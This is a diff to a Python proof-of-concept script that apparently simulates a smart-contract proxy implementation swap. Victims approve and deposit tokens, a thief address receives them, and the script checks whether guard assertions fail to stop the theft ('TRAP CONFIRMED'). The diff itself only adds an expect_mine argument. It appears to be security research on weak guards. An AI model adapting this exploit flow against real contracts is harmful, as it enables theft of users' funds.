@@ -61,13 +61,13 @@ def main():
         return int(rpc("eth_call", [{"to": to_checksum_address(token), "data": "0x" +
             encode_call("balanceOf(address)", THIEF).hex()}, "latest"]), 16)
 
-    def deposit_with(victim, guard_frames, label):
+    def deposit_with(victim, guard_frames, label, **kw):
         """The victim's intent: approve 100 and deposit it into the proxy."""
         return submit(frame_tx(victim, victim, [
             verify_frame(victim.address),
             sender_frame(token, data=encode_call("approve(address,uint256)", proxy, 100)),
             sender_frame(proxy, data=encode_call("deposit(address,uint256)", token, 100)),
-        ] + guard_frames), label)
+        ] + guard_frames), label, **kw)
 
     def new_victim(label):
         v = fresh_account(b, 6 * 10**17, label)
@@ -87,7 +87,7 @@ def main():
     print("\n  [phase A] unguarded victim deposits into the swapped implementation")
     v0 = new_victim("victim A")
     before = thief_balance()
-    o = deposit_with(v0, [], "A unguarded deposit")
+    o = deposit_with(v0, [], "A unguarded deposit", expect_mine=True)
     if not o.mined:
         raise RuntimeError(f"phase A deposit should have mined: {o.simulation}")
     stolen = thief_balance() - before
@@ -104,7 +104,7 @@ def main():
     before = thief_balance()
     o1 = deposit_with(v1, [guard_frame(g_unchanged, encode_call(
         "assertUnchanged(address,address,uint256)", shim, proxy, IMPL_SLOT))],
-        "V1 differential guard (expect PASS = trap)")
+        "V1 differential guard (expect PASS = trap)", expect_mine=True)
     stolen1 = thief_balance() - before
     trap1 = o1.mined and stolen1 > 0
     print(f"    mined={o1.mined} stolen={stolen1} -> {'TRAP CONFIRMED' if trap1 else 'unexpected'}")
@@ -117,7 +117,7 @@ def main():
     before = thief_balance()
     o2 = deposit_with(v2, [guard_frame(g_equals, encode_call(
         "assertCodeHashEquals(address,address,uint256)", shim, proxy, proxy_codehash))],
-        "V2 proxy code-hash guard (expect PASS = trap)")
+        "V2 proxy code-hash guard (expect PASS = trap)", expect_mine=True)
     stolen2 = thief_balance() - before
     trap2 = o2.mined and stolen2 > 0
     print(f"    mined={o2.mined} stolen={stolen2} -> {'TRAP CONFIRMED' if trap2 else 'unexpected'}")
